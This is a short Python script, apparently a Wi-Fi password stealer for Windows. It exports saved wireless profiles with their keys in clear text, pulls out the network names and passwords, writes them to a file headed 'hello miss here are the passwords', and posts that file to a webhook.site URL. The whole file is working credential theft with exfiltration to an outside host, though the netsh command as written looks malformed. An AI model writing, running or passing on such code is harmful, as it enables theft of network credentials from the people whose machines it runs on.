import subprocess
import os
import sys
import requests

url='https://webhook.site/397f275f-64ba-459a-a9e2-13b27693678a'

password_file = open('passwords.txt', "w")
password_file.write("hello miss here are the passwords:\n\n")
password_file.close()

wifi_files = []
wifi_name = []
wifi_password = []

command =subprocess.run(["netsh","export","profile","key=clear"],capture_output = True).stdout.decode()


path = os.getcwd()


for filename in os.listdir(path):
	if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
		wifi_files.append(filename)
		for i in wifi_files:
			with open(i,'r') as f:
				for line in f.readlines():
					if 'name' in line:
						stripped = line.strip()
						front = stripped[6:]
						back = front[:-7]
						wifi_name.append(back)
					if 'keyMaterial' in line:
						stripped = line.strip()
						front = stripped[13:]
						back = front[:-14]
						wifi_password.append(back)
						for x,y in zip(wifi_name,wifi_password):
							sys.stdout = open("passwords.txt","a")
							print("SSID: "+x, "Password: "+y, sep='\n')
							sys.stdout.close()
					
with open('passwords.txt','rb') as f:
	r = requests.post(url, data=f)